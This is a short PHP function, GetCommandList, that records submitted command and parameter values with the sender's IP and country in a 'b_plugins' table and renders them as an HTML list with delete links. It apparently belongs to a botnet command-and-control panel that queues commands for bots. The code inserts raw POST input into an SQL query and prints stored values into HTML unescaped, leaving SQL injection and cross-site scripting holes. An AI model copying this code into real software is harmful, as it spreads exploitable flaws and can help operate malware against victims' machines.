<?php
function GetCommandList($hSql, $sCountry){
	$sHtml = file_get_contents("inc/plugins.html");
	
	$sReturn = "";
	$sCountries = "";
	$dwMax = 0;
	$i = 0;
      
	if (isset($_POST["c"]) && isset($_POST["p"])) {
		mysql_query("INSERT INTO `b_plugins` (`Id` ,`Ip` ,`Time` ,`Command` ,`Parameter`, `Country`) VALUES (NULL , '" . $_SERVER['REMOTE_ADDR'] . "',  '" . time() . "', '" . $_POST["c"] . "', '" . $_POST["p"] . "', '" . $sCountry . "' );");
	}
	
	if (isset($_GET["id"])) {
		mysql_query("DELETE FROM `b_plugins` WHERE `Id` = " . (int)$_GET['id'], $hSql);
	}
      
    $dwResult = mysql_query("SELECT * FROM `b_plugins` WHERE 1=1;", $hSql);

	while ($row = mysql_fetch_array($dwResult)) {
        $gif = StrToLower($row['Country']);

        if (strlen($gif) != 2) {
            $gif = "un";
        }
		$sReturn .= "	<tr>
							<td><img src='data/images/command.png'/></td>
							<td><b>" . $row['Command'] . "</b></td>
							<td>" . date('Y.m.d', $row["Time"]) . "</td>
							<td><img src='data/images/lang/" . $gif . ".gif'/></td>
							<td>" . $row['Ip'] . "</td>
							<td><a href='?plugins&id=" . $row['Id'] . "'><img src='./data/images/close.png' /></a></td>
						</tr>
						<tr>
							<td></td>
							<td colspan='7' style='color: #5a6371;'>" . $row['Parameter'] . "</td>
						</tr>";
		$i++;
    }
	 
	Return str_replace("%ROWS%", $sReturn, $sHtml);
}
?>